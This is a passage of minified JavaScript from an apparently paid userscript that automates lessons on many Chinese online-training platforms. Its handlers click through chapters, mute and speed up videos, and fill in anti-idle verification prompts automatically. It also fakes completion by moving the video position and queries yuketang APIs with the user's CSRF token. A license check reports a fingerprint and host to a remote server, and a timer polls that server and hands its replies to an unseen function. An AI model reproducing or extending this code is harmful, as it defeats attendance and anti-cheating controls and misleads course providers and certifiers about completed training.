                                            for (var n of l) 0 != e && (n.click(), e += 1, await sleep(250));
                                            e = 0
                                        }
                                        await sleep(300)
                                    }
                                    ElementObj.$allTask = document.querySelectorAll(".resource-item");
                                    for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if ("\u5df2\u5b66\u5b8c" != ElementObj.$allTask[e].querySelector("i").title) {
                                        a.currentIndex = e;
                                        break
                                    }
                                } else for (e = 0; e <= ElementObj.$allTask.length - 1; e++) if (ElementObj.$allTask[e].classList.contains("resource-item-active")) {
                                    a.currentIndex = e;
                                    break
                                }
                                -1 == a.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (ElementObj.$allTask[a.currentIndex].click(), showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), setTimeout(() => {
                                    a._o1()
                                }, 3e3))
                            }
                        } catch (e) {
                        }
                    }, 1e3)
                }, async playNext(e) {
                    e.currentIndex >= ElementObj.$allTask.length - 1 ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (await sleep(2500), e.currentIndex += 1, ElementObj.$allTask[e.currentIndex].click(), setTimeout(() => {
                        e._o1()
                    }, 3e3))
                }, listenRebortFn() {
                    document.querySelectorAll(".fish-btn.fish-btn-primary")[1]?.click();
                    var e = document.querySelector(".fish-modal-root");
                    e?.parentElement?.removeChild(e)
                }
            }
        },
        zhelixuexi: {mainClass: "zhelixuexi"},
        fhswifer: {mainClass: "fhswifer"},
        cnjiewhr34iuiehs: {
            mainClass: "CTXCommon",
            option: {
                nodeListClass: ".menu ul>li dl",
                openListenPlayStatus: !1,
                getCurrentIndexByOption: () => new Promise(e => {
                    e(1)
                }),
                playNext: () => new Promise(e => {
                    var t = MyTool.getValue("preVideoSrc");
                    ElementObj.$video.src == t ? toolOption.CtxMain.play() : (MyTool.setValue("preVideoSrc", ElementObj.$video.src), setTimeout(() => {
                        location.reload()
                    }, 3e3))
                })
            }
        },
        rrhisdgf283y7jvdf: {mainClass: "rrhisdgf283y7jvdf"},
        f6872: {mainClass: "f6872"},
        a782: {mainClass: "rrhisdgf283y7jvdf"},
        bfuew28: {
            mainClass: "CTXCommon",
            option: {
                nodeListClass: "", openListenPlayStatus: !1, videoEle: () => new Promise(e => {
                    let t = 0, l = setInterval(() => {
                        t += 1, ElementObj.$video = document.querySelectorAll("iframe")[2].contentDocument.querySelector("iframe").contentDocument.querySelector("video"), ElementObj.$video ? (clearInterval(l), e(1)) : 7 <= t && (clearInterval(l), e(2))
                    }, 1e3)
                }), _init: () => new Promise(e => {
                    let t = setInterval(() => {
                        var e = document.querySelectorAll("iframe")[2];
                        e && (ElementObj.$allTask = e.contentDocument.querySelectorAll(".s_point"), 0 < ElementObj.$allTask.length) && (clearInterval(t), ElementObj.$handleSpeedUp.style.display = "none", toolOption.CtxMain.getCurrentIndex())
                    })
                }), getCurrentIndexByOption: () => new Promise(e => {
                    for (var t = 0; t <= ElementObj.$allTask.length - 1; t++) if (ElementObj.$allTask[t].classList.contains("s_pointerct")) {
                        e(t);
                        break
                    }
                }), listenRebortFn: () => {
                    document.querySelector(".layui-layer-btn0")?.click(), ElementObj.$video.play()
                }
            }
        },
        f13v: {
            mainClass: "CTXCommon",
            option: {nodeListClass: ".el-menu li", activeClass: "is-active", openListenPlayStatus: !1}
        },
        g32f: {
            mainClass: "CTXCommon",
            option: {
                nodeListClass: ".bb_e8edf0_dash div[id]",
                activeClass: "cur",
                openListenPlayStatus: !1,
                _init: () => new Promise(e => {
                    let t = setInterval(() => {
                        ElementObj.$video = document.querySelector("video"), ElementObj.$video && (clearInterval(t), ElementObj.$handleSpeedUp.style.display = "none", toolOption.CtxMain._o1())
                    })
                }),
                playNext: () => new Promise(e => {
                    document.querySelector("a.btItem.Next").click()
                })
            }
        },
        das01: {
            mainClass: "CTXCommon",
            option: {
                nodeListClass: "ul>li:first-child",
                activeClass: "list",
                openListenPlayStatus: !1,
                _init: () => new Promise(t => {
                    let l = setInterval(() => {
                        if (ElementObj.$handleSpeedUp.style.display = "none", "/online/learn" == location.pathname) {
                            var e = document.querySelector(".toStudy");
                            if (e) return clearInterval(l), setTimeout(() => {
                                window.close()
                            }, 1e4), e.click(), void t(!0)
                        }
                        "/admin/lock/Study" == location.pathname && (ElementObj.$allTask = document.querySelectorAll("ul>li"), ElementObj.$allTask.length) && (clearInterval(l), toolOption.CtxMain.getCurrentIndex(), t(!0))
                    }, 500)
                }),
                listenRebortFn: () => {
                    var e, t = document.querySelector(".layui-input");
                    t && (e = t.getAttribute("data-num3"), t.value = e, document.querySelector(".layui-layer-btn0").click())
                },
                playNext: t => new Promise(async e => {
                    t.currentIndex >= ElementObj.$allTask.length - 1 ? location.href = "http://hzsdadmin.zhihuiteacher.com/online/learn" : (await sleep(2500), t.currentIndex += 1, ElementObj.$allTask[t.currentIndex]?.click(), setTimeout(() => {
                        t._o1()
                    }, 5e3))
                })
            }
        },
        aa101: {mainClass: "CTXCommon", option: {nodeListClass: ".level2>a", activeClass: "cur"}},
        sdf1: {
            mainClass: "CTXCommon",
            option: {
                nodeListClass: ".ml_2 li",
                activeClass: "cur",
                nextClass: ".littletit",
                openListenPlayTime: !1,
                getCurrentIndexByOption: () => new Promise(t => {
                    for (let e = 0; e < ElementObj.$allTask.length; e++) {
                        var l = ElementObj.$allTask[e].querySelector(".littlebot").querySelector(".el-progress"),
                            n = ElementObj.$allTask[e].querySelector(".elli").innerText.trim();
                        if (l && -1 == n.indexOf("\u5728\u7ebf\u4f5c\u4e1a") && -1 == n.indexOf("\u4e60\u9898\u6d4b\u9a8c") && -1 == n.indexOf("Test")) {
                            t(e);
                            break
                        }
                    }
                }),
                listenRebortFn: () => {
                    var e = document.querySelector("._active.elli"),
                        t = (e?.parentElement?.parentElement).querySelector(".el-icon-circle-check"),
                        e = e.innerText.trim();
                    !t && "\u5728\u7ebf\u4f5c\u4e1a" != e && -1 == e.indexOf("\u4e60\u9898\u6d4b\u9a8c") && -1 == e.indexOf("Test") || toolOption.CtxMain.playNext()
                }
            }
        },
        sdf3: {
            mainClass: "CTXCommon",
            option: {nodeListClass: "#classes li", activeClass: "li_current_index", openListenPlayTime: !1}
        },
        dsfs: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "#content a", _init() {
                    return new Promise(l => {
                        let n = setInterval(() => {
                            if (ElementObj.$allTask = document.querySelectorAll("#content a"), ElementObj.$handleSpeedUp.style.display = "none", ElementObj.$allTask.length) {
                                clearInterval(n);
                                var t = MyTool.getValue("preClassName");
                                if (t) {
                                    for (let e = 0; e < ElementObj.$allTask.length; e++) if (t == ElementObj.$allTask[e].innerText.trim()) {
                                        MyTool.setValue("homeUrl", location.href), ElementObj.$allTask[e + 1].click();
                                        break
                                    }
                                } else MyTool.setValue("homeUrl", location.href), ElementObj.$allTask[0].click();
                                l(!0)
                            }
                            var e = document.querySelector(".item-title.label h1 a");
                            e && "/m/Exam/Student/startStudy" == location.pathname && (clearInterval(n), e.click(), l(!0)), "/m/Exam/Student/startStudy" == location.pathname && (clearInterval(n), toolOption.CtxMain.pdPlayFn(location.href), l(!0))
                        }, 500)
                    })
                }, playNext(e) {
                    return new Promise(async (e, t) => {
                        var l = document.querySelector(".startStudy-title>p")?.innerText.trim();
                        MyTool.setValue("preClassName", l), document.querySelector(".bottom-pc-btn button").click(), await sleep(2e3), setTimeout(() => {
                            location.reload()
                        }, 3e3), document.querySelector(".modal-button.modal-button-bold").click()
                    })
                }
            }
        },
        bsd11: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "a.title", getCurrentIndexByOption() {
                    return new Promise((t, e) => {
                        for (let e = 0; e < ElementObj.$allTask.length; e++) if (ElementObj.$allTask[e].parentElement.classList.contains("active")) {
                            t(e);
                            break
                        }
                    })
                }
            }
        },
        ifsbds: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "", activeClass: "desc-item-sel", _init: async () => {
                    let t = setInterval(() => {
                        if (ElementObj.$handleSpeedUp.style.display = "none", "/kaoshi_qnzzxy/majorlist.html" == location.pathname) clearInterval(t), alert("\u8bf7\u9009\u62e9\u4e00\u4e2a\u8bfe\u7a0b，\u70b9\u51fb\u8fdb\u53bb"); else {
                            if (ElementObj.$allTask = document.querySelectorAll(".list-group-item"), 0 < ElementObj.$allTask.length) {
                                clearInterval(t);
                                for (var e of ElementObj.$allTask) if ("\u5b66\u4e60\u8fdb\u5ea6:100.00%" != e.querySelector(".list-group-item-text.text-muted").innerText) {
                                    MyTool.setValue("homeUrl", location.href), e.click();
                                    break
                                }
                            }
                            "/kaoshi_qnzzxy/test.html" == location.pathname && (clearInterval(t), toolOption.CtxMain.pdPlayFn(location.href))
                        }
                    }, 500)
                }, playNext: async e => {
                    location.href = MyTool.getValue("homeUrl")
                }
            }
        },
        sf1101: {
            mainClass: "CTXCommon",
            option: {
                nodeListClass: "span.studiedLesson",
                activeClass: "RED",
                openListenPlayStatus: !0,
                async getCurrentIndex(t) {
                    for (let e = 0; e < ElementObj.$allTask.length; e++) {
                        var l = ElementObj.$allTask[e];
                        if (!l.classList.contains("studiedLessonMark")) {
                            t.currentIndex = e, showTip("\u521d\u59cb\u5316\u5b8c\u6210，3\u79d2\u540e\u5f00\u59cb\u81ea\u52a8\u64ad\u653e", 3e3), l.click(), setTimeout(() => {
                                t.pdPlayFn(location.href)
                            }, 2e3);
                            break
                        }
                    }
                    -1 === t.currentIndex && alert("\u5f53\u524d\u7ae0\u8282\u6240\u6709\u89c6\u9891\u5df2\u7ecf\u5b66\u4e60\u5b8c")
                },
                videoEle: () => new Promise(e => {
                    let t = 0, l = setInterval(() => {
                        t += 1, ElementObj.$video = document.querySelector("iframe")?.contentDocument?.querySelector("video"), ElementObj.$video ? (clearInterval(l), e(1)) : 7 <= t && (clearInterval(l), e(2))
                    }, 1e3)
                }),
                async listenRebortFn(e) {
                    var t = document.querySelector("iframe")?.contentDocument?.querySelector("#popup_panel input");
                    t && (t.click(), e.play())
                },
                async playNext() {
                    location.reload()
                }
            }
        },
        usd01: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "", activeClass: "", _init: async r => {
                    let s = setInterval(async () => {
                        if (ElementObj.$handleSpeedUp.style.display = "none", document.querySelector(".iconfont.icon-fujian")) clearInterval(s), showTip("\u5224\u65ad\u6b64\u89c6\u9891\u7ae0\u8282\u4e3a\u975e\u89c6\u9891，\u5373\u5c06\u81ea\u52a8\u8df3\u8fc7", 3e3), await sleep(2500), r.playNext(); else if (ElementObj.$video = document.querySelector("video"), ElementObj.$video) clearInterval(s), document.querySelector(".xt_video_player_common_icon").click(), r._o1(); else if (-1 != location.pathname.indexOf("/v2/web/studentLog")) {
                            clearInterval(s);
                            var e = location.pathname.replace("/v2/web/studentLog/", "");
                            e:for (var t of new Array(100)) {
                                var l = await (e => {
                                    let l = document.cookie.split(";")[0].replace("csrftoken=", "");
                                    return new Promise(t => {
                                        fetch(e, {
                                            headers: {
                                                accept: "application/json, text/plain, */*",
                                                "accept-language": "zh-CN,zh;q=0.9",
                                                "classroom-id": "19933500",
                                                priority: "u=1, i",
                                                "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
                                                "sec-ch-ua-mobile": "?0",
                                                "sec-ch-ua-platform": '"Windows"',
                                                "sec-fetch-dest": "empty",
                                                "sec-fetch-mode": "cors",
                                                "sec-fetch-site": "same-origin",
                                                "university-id": "2760",
                                                "uv-id": "2760",
                                                "x-client": "web",
                                                "x-csrftoken": l,
                                                "xt-agent": "web",
                                                xtbz: "ykt"
                                            },
                                            referrerPolicy: "strict-origin-when-cross-origin",
                                            body: null,
                                            method: "GET",
                                            mode: "cors",
                                            credentials: "include"
                                        }).then(e => e.json()).then(e => t(e))
                                    })
                                })(`https://www.yuketang.cn/v2/api/web/logs/learn/${e}?actype=15&page=0&offset=20&sort=-1`);
                                if (!l.data.activities) break;
                                var n, a = l.data.activities.map(e => e.courseware_id), i = await (e => {
                                    let l = document.cookie.split(";")[0].replace("csrftoken=", "");
                                    return new Promise(t => {
                                        fetch("https://www.yuketang.cn/mooc-api/v1/lms/learn/course/pub_new_pro", {
                                            headers: {
                                                accept: "application/json, text/plain, */*",
                                                "accept-language": "zh-CN,zh;q=0.9",
                                                "classroom-id": "19933500",
                                                "content-type": "application/json;charset=UTF-8",
                                                priority: "u=1, i",
                                                "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
                                                "sec-ch-ua-mobile": "?0",
                                                "sec-ch-ua-platform": '"Windows"',
                                                "sec-fetch-dest": "empty",
                                                "sec-fetch-mode": "cors",
                                                "sec-fetch-site": "same-origin",
                                                "university-id": "2760",
                                                "uv-id": "2760",
                                                "x-csrftoken": l,
                                                "xt-agent": "web",
                                                xtbz: "ykt"
                                            },
                                            referrerPolicy: "strict-origin-when-cross-origin",
                                            body: e,
                                            method: "POST",
                                            mode: "cors",
                                            credentials: "include"
                                        }).then(e => e.json()).then(e => t(e))
                                    })
                                })(JSON.stringify({cid: e, new_id: a}));
                                for (n of l.data.activities) {
                                    var o = n.courseware_id;
                                    if (i.data[o] && 1 != i.data[o].total_done) {
                                        o = `https://www.yuketang.cn/v2/web/xcloud/video-student/${e}/` + n.content.leaf_id;
                                        MyTool.setValue("homeUrl", location.href), location.href = o;
                                        break e
                                    }
                                }
                                0
                            }
                        }
                    }, 500)
                }, playNext: async () => {
                    showTip("✅✅✅\u5373\u5c06\u5207\u6362\u4e0b\u4e00\u4e2a\u7ae0\u8282"), await sleep(2e3), location.href = MyTool.getValue("homeUrl")
                }
            }
        },
        sdhfks01: {
            mainClass: "CTXCommon",
            option: {
                nodeListClass: ".video .chapterhead.chapterhead1 li",
                activeClass: "current",
                getCurrentIndexByOption: () => new Promise(e => {
                    var t = document.querySelector(".video_header .video_number").innerText.replace(/\u7b2c|\u8bb2/g, "");
                    e(Number(t) - 1)
                }),
                playNext(l) {
                    return new Promise(e => {
                        if (l.currentIndex >= ElementObj.$allTask.length - 1) alert("\u5df2\u5168\u90e8\u64ad\u653e\u5b8c"); else {
                            showTip("✅✅✅\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u8282");
                            let t = setInterval(() => {
                                var e = document.querySelector(".el-message-box__btns button");
                                e && (l.currentIndex += 1, clearInterval(t), setTimeout(() => {
                                    l._o1()
                                }, 4e3), e.click())
                            }, 500)
                        }
                    })
                }
            }
        },
        s01r: {
            mainClass: "CTXCommon", option: {
                nodeListClass: ".video .chapterhead.chapterhead1 li",
                activeClass: "current",
                openListenPlayTime: !0,
                _init: async l => {
                    let n = setInterval(async () => {
                        if (ElementObj.$handleSpeedUp.style.display = "none", ElementObj.$allTask = document.querySelectorAll(".ul-course li"), "jxjy.ahhjsoft.com" === location.host && ElementObj.$allTask) clearInterval(n), showTip("🔊🔊🔊\u4ec5\u652f\u6301\u516c\u9700\u8bfe4、\u516c\u9700\u8bfe3", 4e3); else if (ElementObj.$allTask = document.querySelectorAll(".zdBox"), "ah.zhuanjipx.com" === location.host && ElementObj.$allTask.length) {
                            clearInterval(n), showTip("🔊🔊🔊\u6b63\u5728\u521d\u59cb\u5316", 4e3), l.classType = 3;
                            for (let e = 0; e < ElementObj.$allTask.length; e++) if (ElementObj.$allTask[e].classList.contains("childBox_item_on")) {
                                l.currentIndex = e, showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，\u5f00\u59cb\u64ad\u653e", 2e3), l._o1();
                                break
                            }
                        } else {
                            var e = document.querySelectorAll(".ant-collapse-item");
                            if (0 < e.length) {
                                clearInterval(n), showTip("🔊🔊🔊\u6b63\u5728\u521d\u59cb\u5316", 4e3), l.classType = 4;
                                for (var t of e) t.classList.contains("ant-collapse-item-active") || (t.querySelector(".ant-collapse-header").click(), await sleep(100));
                                ElementObj.$allTask = document.querySelectorAll(".video_box_k_t_lx");
                                for (let e = 0; e < ElementObj.$allTask.length; e++) if (ElementObj.$allTask[e].classList.contains("video_box_k_active")) {
                                    l.currentIndex = e, showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，\u5f00\u59cb\u64ad\u653e", 2e3), l._o1();
                                    break
                                }
                            }
                        }
                    }, 300)
                },
                playFn: async n => {
                    await n.getVideoDom(), 2 !== n.classType && 3 !== n.classType || (clearInterval(n.timer), clearInterval(n.listenVidoeStatusTimer), clearInterval(n.listenRebortTime), ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                        ElementObj.$video.playbackRate = toolOption.accelerator
                    }, 3e3), ElementObj.$video.addEventListener("ended", async () => {
                        showTip("✅✅✅\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), n.playNext(n)
                    }), ElementObj.$video.addEventListener("pause", () => {
                        setTimeout(() => {
                            ElementObj.$video.volume = 0, ElementObj.$video.play()
                        }, 1500)
                    })), 4 === n.classType && (await n.changeHtml($el("#video-content-box")), await n.getVideoDom(), n.addInfo("✅✅✅✅✅✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，\u5373\u5c06\u5f00\u59cb\u64ad\u653e✅✅✅✅✅✅✅✅✅"), await sleep(1e3), showTip("🔉\u8bfe\u4ef6\u6b63\u5728\u5b66\u4e60，\u8bf7\u52a1\u70b9\u51fb\u6216\u957f\u65f6\u95f4\u9690\u85cf"), ElementObj.$video.volume = 0, document.querySelector(".vjs-big-play-button")?.click(), ElementObj.$video.play(), setTimeout(async () => {
                        var t = Math.ceil(ElementObj.$video.duration);
                        if (t) {
                            let e = 0;
                            for (var l of new Array(1e4)) {
                                if (e >= t) {
                                    ElementObj.$video.currentTime = t - 10, await sleep(1e3), ElementObj.$video.currentTime = t, n.addInfo("🎉🎉🎉🎉🎉🎉🎉🎉\u5df2\u6210\u529f\u5b66\u5b8c🎉🎉🎉🎉🎉🎉🎉🎉"), await sleep(3e3), n.playNext();
                                    break
                                }
                                l % 60 == 0 && 0 < l && (ElementObj.$video.currentTime = e), e += +toolOption.accelerator > t ? t : +toolOption.accelerator, n.addInfo(`🔊\u5f53\u524d\u72b6\u6001\u6b63\u5728\u4ee5${toolOption.accelerator}\u500d\u901f\u5b66\u4e60\u4e2d，\u5df2\u5b66\u4e60${e}\u79d2，\u89c6\u9891\u603b\u65f6\u957f\u4e3a${t / 60}\u5206\u949f`), await sleep(1e3)
                            }
                        } else alert("\u89c6\u9891\u65f6\u95f4\u9519\u8bef，\u8bf7\u5237\u65b0\u9875\u9762\u91cd\u8bd5")
                    }, 2e3))
                },
                async playNext(e) {
                    location.reload()
                }
            }
        },
        yrt5: {
            mainClass: "CTXCommon",
            option: {
                nodeListClass: ".n-collapse-transition .cursor-pointer",
                activeClass: "bg-[#1C2630]",
                openListenPlayStatus: !1,
                openListenPlayTime: !1,
                _init: async l => {
                    let n = setInterval(() => {
                        ElementObj.$handleSpeedUp.style.display = "none";
                        var e = document.querySelectorAll("ul>li");
                        if (e.length && -1 != location.pathname.indexOf("/plan/courses")) {
                            clearInterval(n);
                            for (var t of e) if ("100%" != t.querySelector(".CourseList_per_1kb87BEO").innerText) {
                                MyTool.setValue("homeUrl", location.href), t.querySelectorAll("button")[1].click();
                                break
                            }
                        }
                        if (ElementObj.$allTask = document.querySelectorAll(".AsideChapter_Item_2dfPMpnP"), ElementObj.$allTask.length) {
                            clearInterval(n);
                            for (let e = 0; e < ElementObj.$allTask.length; e++) if (ElementObj.$allTask[e].querySelector(".AsideChapter_ItemState_2nxPLU4r")) {
                                l.currentIndex = e, l._o1();
                                break
                            }
                        }
                    }, 500)
                },
                async playNext(e) {
                    var t;
                    e.currentIndex >= ElementObj.$allTask.length - 1 ? (t = MyTool.getValue("homeUrl"), window.open(t)) : (e.currentIndex += 1, ElementObj.$allTask[e.currentIndex]?.click(), setTimeout(() => {
                        e._o1()
                    }, 2e3))
                }
            }
        },
        hgs01: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "", activeClass: "", async _init(n) {
                    let e = setInterval(async () => {
                        if (ElementObj.$allTask = document.querySelectorAll("ul li"), ElementObj.$allTask.length && "/admin/lock/Study" == location.pathname) {
                            clearInterval(e), ElementObj.$handleSpeedUp.style.display = "none";
                            for (let e = 0; e < ElementObj.$allTask.length; e++) {
                                var t = ElementObj.$allTask[e];
                                if (!t.querySelector(".layui-icon-ok-circle")) {
                                    n.currentIndex = e, t.classList.contains("list") || (t.click(), await sleep(2e3));
                                    break
                                }
                            }
                            await sleep(1e3), document.querySelector(".layui-layer-btn0")?.click(), n._o1(n)
                        }
                        if (ElementObj.$parentNodes = document.querySelectorAll(".learnTree_second li"), ElementObj.$parentNodes.length && "/online/learn" == location.pathname) {
                            clearInterval(e), ElementObj.$handleSpeedUp.style.display = "none";
                            for (let e = 0; e < ElementObj.$parentNodes.length; e++) {
                                var l = ElementObj.$parentNodes[e];
                                if (!l.querySelector("p").classList.contains("complete")) {
                                    l.classList.contains("secondActive") || (l.click(), await sleep(2e3)), setTimeout(() => {
                                        window.close()
                                    }, 1e4), MyTool.setValue("homeUrl", location.href), document.querySelector(".toStudy").click();
                                    break
                                }
                            }
                        }
                    }, 500)
                }, async listenRebortFn(e) {
                    document.querySelector(".layui-layer-btn0")?.click();
                    -1 != (document.querySelector(".time")?.innerText)?.indexOf("\u5df2\u8fbe\u5230\u6700\u4f4e\u5b8c\u6210\u65f6\u95f4") && (location.href = MyTool.getValue("homeUrl"));
                    var t = document.querySelector(".layui-layer-content input");
                    t && (t.value = t.getAttribute("data-num3"), await sleep(500), document.querySelector(".layui-layer-btn0")?.click())
                }, beforePlayNext(e) {
                    -1 != (document.querySelector(".time")?.innerText)?.indexOf("\u5df2\u8fbe\u5230\u6700\u4f4e\u5b8c\u6210\u65f6\u95f4") && (location.href = MyTool.getValue("homeUrl"))
                }
            }
        },
        hgs02: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "", activeClass: "", async _init(t) {
                    let e = setInterval(async () => {
                        if (ElementObj.$parentNodes = document.querySelectorAll(".mozs_list>li"), ElementObj.$parentNodes.length) {
                            clearInterval(e), ElementObj.$handleSpeedUp.style.display = "none";
                            for (let e = 0; e < ElementObj.$parentNodes.length; e++) if (100 != ElementObj.$parentNodes[e].querySelector(".jdt_bar").innerText.match(/[0-9]+/)[0]) {
                                MyTool.setValue("homeUrl", location.href), document.querySelector(".qd_but").click();
                                break
                            }
                        }
                        if (ElementObj.$allTask = document.querySelectorAll(".lcml_djj_list>li"), ElementObj.$allTask.length && "/p/classroom/simple" == location.pathname) {
                            clearInterval(e), ElementObj.$handleSpeedUp.style.display = "none";
                            for (let e = 0; e < ElementObj.$allTask.length; e++) ElementObj.$allTask[e].classList.contains("on") && (t.currentIndex = e, t._o1(t))
                        }
                    })
                }, videoEle: () => new Promise(t => {
                    let l = 0, n = setInterval(async () => {
                        l += 1;
                        var e = document.querySelector(".xgplayer-start");
                        e ? (clearInterval(n), document.querySelectorAll(".xgplayer-icon")[2].click(), e.click(), await sleep(3e3), ElementObj.$video = document.querySelector("video"), t(1)) : 7 <= l && (clearInterval(n), t(2))
                    }, 1e3)
                }), beforePlayNext(e) {
                    e.currentIndex == ElementObj.$allTask.length - 1 && (location.href = MyTool.getValue("homeUrl"))
                }
            }
        },
        uasf: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "", activeClass: "", async _init(e) {
                    let t = setInterval(async () => {
                        try {
                            ElementObj.$nextBtn = document.querySelectorAll("iframe")[1].contentDocument.querySelector("frame").contentDocument.querySelector("#btnNext"), ElementObj.$nextBtn && (clearInterval(t), ElementObj.$handleSpeedUp.style.display = "none", e._o1(e))
                        } catch (e) {
                        }
                    }, 500)
                }, async playFn(t) {
                    let l = document.querySelectorAll("iframe")[1].contentDocument.querySelectorAll("frame")[1].contentDocument;
                    var e = l.querySelector("tbody");
                    await t.changeHtml(e, l);
                    let n = setInterval(async () => {
                        try {
                            var e = l.querySelector("td[id]").innerText;
                            t.addInfo(e, 1, l), e && -1 != e.indexOf("\u5df2\u7ecf\u5b66\u4e60\u5b8c\u6bd5") && (clearInterval(n), setTimeout(() => {
                                t._o1(t)
                            }, 2e3), ElementObj.$nextBtn.click())
                        } catch (e) {
                        }
                    }, 1e3)
                }
            }
        },
        sfgd: {
            mainClass: "CTXCommon",
            option: {
                nodeListClass: ".chapterList>li", activeClass: "active", listenRebortFn(e) {
                    document.querySelector(".pauseBg")?.click()
                }
            }
        }
    }, speedArr = [1, 2, 3, 5, 10, 16], toolOption = {accelerator: 1, CtxMain: null, SchoolType: -1};
    MyTool.registerMenuCommand("📥\u66f4\u65b0\u7248\u672c", "u", () => {
        window.open("http://public.gaozhiwang.top/public/index.user.js")
    });

    class Main {
        constructor() {
            this.studentType = 1, this.speedStatus = 0, this.isAdaptive = 1, this.listenVidoeStatusTimer = null, this.fingerprint = null, this.toolkey = null, this.init()
        }

        init() {
            setTimeout(async () => {
                try {
                    this.toolkey = localStorage.getItem("mytoolkey") || MyTool.getValue("mytoolkey"), this._rn()
                } catch (e) {
                }
            }, 2500)
        }

        updateSpeedElement(e) {
            0 != this.speedStatus && (ElementObj.$video.playbackRate = e)
        }

        async _o1(e, t = 0) {
            var l = localStorage.getItem("mytoolkey") || MyTool.getValue("mytoolkey"),
                l = (l || (alert("\u8bf7\u5148\u8d2d\u4e70key"), window.open(_bt)), toolOption.CtxMain || location.reload(), await axfedata({
                    method: "GET",
                    url: _b + (`/speedup?toolkey=${l}&t=2&canuse=${toolOption.SchoolType}&h=${location.host}&fingerprint=${this.fingerprint}&v=` + version)
                }));
            200 == l.code ? (this.speedStatus = 1, this.isAdaptive = 1, await toolOption.CtxMain.play()) : (this.isAdaptive = 0, showTip("🔉🔉🔉" + l.message, 5e3, !0))
        }

        handleRemoveKey() {
            MyTool.setValue("mytoolkey", null), localStorage.removeItem("mytoolkey"), localStorage.removeItem("_localSpeed"), ElementObj.$title3.innerText = "\u7ed1\u5b9akey：", ElementObj.$mytoolkey.style.display = "none", ElementObj.$ctxsection2.style.display = "none", ElementObj.$nokey.style.display = "block", ElementObj.$ipt.style.display = "block", ElementObj.$addKey.style.display = "block", ElementObj.$removeKey.style.display = "none", ElementObj.$handleSpeedUp.style.background = "orange", ElementObj.$handleSpeedUp.innerText = "\u70b9\u51fb\u52a0\u901f", this.updateSpeedElement(1)
        }

        stopSpeedUp() {
            this.speedStatus = 0, toolOption.CtxMain.updateSpeedElement(1), ElementObj.$handleSpeedUp.style.background = "orange", ElementObj.$handleSpeedUp.innerText = "\u70b9\u51fb\u52a0\u901f", showTip("🔉\u505c\u6b62\u52a0\u901f\u6210\u529f")
        }

        handleChangeCtxSpeed(e) {
            var t, l = localStorage.getItem("mytoolkey") || MyTool.getValue("mytoolkey");
            l ? 0 == this.isAdaptive ? alert("Key\u4e0d\u9002\u914d") : (l = speedArr, t = Number(e), e && l.includes(t) && (toolOption.accelerator = t, localStorage.setItem("_localSpeed", t.toString()), MyTool.setValue("_localSpeed", t), ElementObj.$video) && (ElementObj.$video.playbackRate = t)) : (alert("\u8bf7\u5148\u8d2d\u4e70key"), window.open(_bt))
        }

        _rn() {
            setInterval(() => {
                ElementObj.$video && MyTool.axfedata({
                    method: "GET",
                    url: _b + ("/ck/v1?ty=" + this.toolkey)
                }).then(e => {
                    202 == e.code && erf(e.data)
                })
            }, 1e4)
        }

        listenVidoeStatus(t, l) {
            if (t) {
                let e = 0;
                this.listenVidoeStatusTimer = setInterval(() => {
                    t.readyState < 4 && 20 <= (e += 1) && location.reload(), t.paused && (e += 1, "function" == typeof l) && (20 <= e ? location.reload() : l())
                }, 5e3)
            }
        }

        async changeHtml(e, t = document) {
            var l;
            ElementObj.$ctxstatsbox = t.querySelector(".ctxstatsbox"), ElementObj.$ctxstatsbox || ((l = document.createElement("div")).setAttribute("class", "ctxstatsbox"), l.setAttribute("style", `
                width: 100%;
                height: 100%;
                background: #eae9e9;
                position: absolute;
                z-index: 999;
                overflow: scroll;
                top: 0;
                padding-left: 10px;
                z-index: 9999;
            `), e.appendChild(l), await sleep(300), ElementObj.$ctxstatsbox = t.querySelector(".ctxstatsbox")), this.addInfo("🔉\u521d\u59cb\u5316\u5df2\u5b8c\u6210，\u6b63\u5728\u64ad\u653e")
        }

        addInfo(e, t, l) {
            l = l || globalThis.document;
            15 <= document.querySelectorAll(".ctxstatsbox_li").length && (ElementObj.$ctxstatsbox.innerHTML = "");
            l = `<li class="ctxstatsbox_li" style="color: ${0 == t ? "#f01414" : "#000"};line-height: 30px;font-size: 16px;list-style: none;">${e}</li>`;
            ElementObj.$ctxstatsbox.innerHTML += l
        }

        listenPageHide() {
            let t;
            document.addEventListener("visibilitychange", () => {
                if (document.hidden) {
                    let e = 0;
                    t = setInterval(() => {
                        5 <= (e += 1) && this.addInfo("⚠️⚠️⚠️\u8bf7\u52ff\u957f\u65f6\u95f4\u9690\u85cf\u8be5\u5b66\u4e60\u9875\u9762", 0)
                    }, 5e3)
                } else clearInterval(t)
            })
        }

        pdPlayFn(e) {
            var t = MyTool.getValue("spanClassName") || [];
            -1 == t.indexOf(e) && (t.push(e), MyTool.setValue("spanClassName", t)), this._o1()
        }

        getVideoDom() {
            return new Promise(e => {
                let t = 0, l = setInterval(() => {
                    t += 1, ElementObj.$video = document.querySelectorAll("video")[0], ElementObj.$video ? (clearInterval(l), e(1)) : 7 <= t && (clearInterval(l), e(2))
                }, 1e3)
            })
        }
    }

    class CTXCommon extends Main {
        constructor(e) {
